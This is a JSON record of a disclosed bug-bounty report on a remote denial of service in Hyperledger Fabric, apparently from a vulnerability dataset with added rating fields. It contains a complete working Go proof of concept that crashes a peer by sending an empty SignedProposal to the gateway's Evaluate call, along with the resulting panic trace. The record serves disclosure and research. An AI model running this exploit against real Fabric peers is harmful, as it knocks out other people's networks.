{
  "reported_to": "Hyperledger",
  "reported_by": "fatal0 ",
  "title": "Remote denial of service in HyperLedger Fabric",
  "content": "\nHow to reproduce\n1.Bring up the test network.(https://hyperledger-fabric.readthedocs.io/en/latest/test_network.html#bring-up-the-test-network)\n2.Run the PoC.\nCode 40 Bytes\n1go run poc.go -server=192.168.0.208:7051\nCode 898 Bytes\n1package main\n2\n3import (\n4\t\"context\"\n5\t\"crypto/tls\"\n6\t\"flag\"\n7\t\"fmt\"\n8\n9\t\"github.com/hyperledger/fabric-protos-go/gateway\"\n10\t\"github.com/hyperledger/fabric-protos-go/peer\"\n11\n12\t\"google.golang.org/grpc\"\n13\t\"google.golang.org/grpc/credentials\"\n14)\n15\n16func main() {\n17\n18\tvar srv string\n19\tflag.StringVar(&srv, \"server\", \"localhost:7050\", \"The RPC server to connect to.\")\n20\n21\tflag.Parse()\n22\n23\tconfig := &tls.Config{\n24\t\tInsecureSkipVerify: true,\n25\t}\n26\n27\tconn, err := grpc.Dial(srv, grpc.WithTransportCredentials(credentials.NewTLS(config)))\n28\t\n29\tdefer func() {\n30\t\t_ = conn.Close()\n31\t}()\n32\n33\tif err != nil {\n34\t\tfmt.Println(\"Error connecting:\", err)\n35\t\treturn\n36\t}\n37\n38\n39\tpayload := &gateway.EvaluateRequest{}\n40\n41\n42\tpayload.ProposedTransaction = &peer.SignedProposal{}\n43\n44\n45\n46\tresp, err := gateway.NewGatewayClient(conn).Evaluate(context.TODO(), payload)\n47\tif err != nil {\n48\t\tfmt.Println(\"Error connecting:\", err)\n49\t\treturn\n50\t}\n51\n52\n53\tfmt.Println(\"resp:\", resp)\n54\n55}\n56\n3.Crash.\nCode 3.54 KiB\n1panic: runtime error: invalid memory address or nil pointer dereference\n2[signal SIGSEGV: segmentation violation code=0x1 addr=0x8 pc=0x157d6c7]\n3\n4goroutine 381927 [running]:\n5github.com/hyperledger/fabric/internal/pkg/gateway.getChannelAndChaincodeFromSignedProposal(0x0?)\n6        /go/src/github.com/hyperledger/fabric/internal/pkg/gateway/apiutils.go:49 +0xe7\n7github.com/hyperledger/fabric/internal/pkg/gateway.(*Server).Evaluate(0xc0001dd3e0, {0x1b55c58?, 0xc00359aa80}, 0xc003470600)\n8        /go/src/github.com/hyperledger/fabric/internal/pkg/gateway/api.go:43 +0x85\n9github.com/hyperledger/fabric-protos-go/gateway._Gateway_Evaluate_Handler.func1({0x1b55c58, 0xc00359aa80}, {0x18ed0a0?, 0xc003470600})\n10        /go/src/github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-protos-go/gateway/gateway.pb.go:1176 +0x78\n11github.com/hyperledger/fabric/internal/peer/node.unaryGrpcLimiter.func1({0x1b55c58, 0xc00359aa80}, {0x18ed0a0, 0xc003470600}, 0x195a8d5?, 0xc003400210)\n12        /go/src/github.com/hyperledger/fabric/internal/peer/node/grpc_limiters.go:49 +0x38e\n13github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1.1.1({0x1b55c58?, 0xc00359aa80?}, {0x18ed0a0?, 0xc003470600?})\n14        /go/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:25 +0x3a\n15github.com/hyperledger/fabric/common/grpclogging.UnaryServerInterceptor.func1({0x1b55c58, 0xc00359a810}, {0x18ed0a0, 0xc003470600}, 0xc000308420, 0xc000308440)\n16        /go/src/github.com/hyperledger/fabric/common/grpclogging/server.go:92 +0x305\n17github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1.1.1({0x1b55c58?, 0xc00359a810?}, {0x18ed0a0?, 0xc003470600?})\n18        /go/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:25 +0x3a\n19github.com/hyperledger/fabric/common/grpcmetrics.UnaryServerInterceptor.func1({0x1b55c58, 0xc00359a810}, {0x18ed0a0, 0xc003470600}, 0x7f0fb3c94a38?, 0xc000308460)\n20        /go/src/github.com/hyperledger/fabric/common/grpcmetrics/interceptor.go:31 +0x17b\n21github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1.1.1({0x1b55c58?, 0xc00359a810?}, {0x18ed0a0?, 0xc003470600?})\n22        /go/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:25 +0x3a\n23github.com/grpc-ecosystem/go-grpc-middleware.ChainUnaryServer.func1({0x1b55c58, 0xc00359a810}, {0x18ed0a0, 0xc003470600}, 0xc000521ae0?, 0x17ab820?)\n24        /go/src/github.com/hyperledger/fabric/vendor/github.com/grpc-ecosystem/go-grpc-middleware/chain.go:34 +0xbf\n25github.com/hyperledger/fabric-protos-go/gateway._Gateway_Evaluate_Handler({0x189b040?, 0xc0001dd3e0}, {0x1b55c58, 0xc00359a810}, 0xc0034705a0, 0xc0001f0720)\n26        /go/src/github.com/hyperledger/fabric/vendor/github.com/hyperledger/fabric-protos-go/gateway/gateway.pb.go:1178 +0x138\n27google.golang.org/grpc.(*Server).processUnaryRPC(0xc0006a2e00, {0x1b5a950, 0xc0002f4480}, 0xc00321e100, 0xc00045a780, 0x2398808, 0xc00357a740)\n28        /go/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:1180 +0xc8f\n29google.golang.org/grpc.(*Server).handleStream(0xc0006a2e00, {0x1b5a950, 0xc0002f4480}, 0xc00321e100, 0xc00357a740)\n30        /go/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:1503 +0xa1b\n31google.golang.org/grpc.(*Server).serveStreams.func1.2()\n32        /go/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:843 +0x98\n33created by google.golang.org/grpc.(*Server).serveStreams.func1\n34        /go/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:841 +0x28a\nImpact\nIt can easily break down as many peers as the attacker wants.\n\n",
  "severity": [
    8.3,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Uncontrolled Resource Consumption"
  ],
  "screenshots": {},
  "disclosed_date": 1662055500,
  "report_url": "https://hackerone.com/reports/1635854",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "API",
  "steps": [
    [
      1,
      "Bring up the test network as described in the HyperLedger Fabric documentation"
    ],
    [
      2,
      "Run the provided PoC code (poc.go) targeting the server address of a HyperLedger Fabric peer"
    ]
  ],
  "vuln_description": "The vulnerability is a remote denial of service in HyperLedger Fabric caused by a nil pointer dereference when processing an Evaluate request with an empty SignedProposal. This causes the peer process to crash, allowing an attacker to take down multiple peers.",
  "reason": "The vulnerability requires understanding the gRPC interface of HyperLedger Fabric and crafting a malformed request, but the core issue is straightforward once the interface is understood. The attack doesn't involve complex state manipulation or multiple interacting components.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}